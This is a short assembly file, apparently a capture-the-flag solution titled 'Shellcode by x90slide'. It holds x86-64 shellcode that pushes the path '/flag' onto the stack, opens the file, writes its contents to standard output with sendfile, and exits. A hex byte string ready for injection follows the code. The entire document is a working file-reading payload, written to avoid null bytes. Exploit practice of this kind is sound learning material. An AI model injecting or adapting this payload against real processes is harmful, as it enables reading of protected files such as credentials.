# Shellcode by x90slide

.global _start
_start:
.intel_syntax noprefix
	mov ebx, 0x67616c66 # Little Endian File Location
	shl rbx, 8
	mov bl, 0x2f    
	push rbx
	xor rax, rax
	mov al, 2
	mov rdi, rsp
	xor rsi, rsi
	syscall

	xor r10, r10
	mov r10b, 1
	shl r10, 12
	xor rdx, rdx
	mov rsi, rax
	xor rdi, rdi
	mov dil, 1
	xor rax, rax
	mov al, 40
	syscall

	xor rax, rax
	mov al, 60
	syscall


# "\xbb\x66\x6c\x61\x67\x48\xc1\xe3\x08\xb3\x2f\x53\x48\x31\xc0\xb0\x02\x48\x89\xe7\x48\x31\xf6\x0f\x05\x4d\x31\xd2\x41\xb2\x01\x49\xc1\xe2\x0c\x48\x31\xd2\x48\x89\xc6\x48\x31\xff\x40\xb7\x01\x48\x31\xc0\xb0\x28\x0f\x05\x48\x31\xc0\xb0\x3c\x0f\x05"
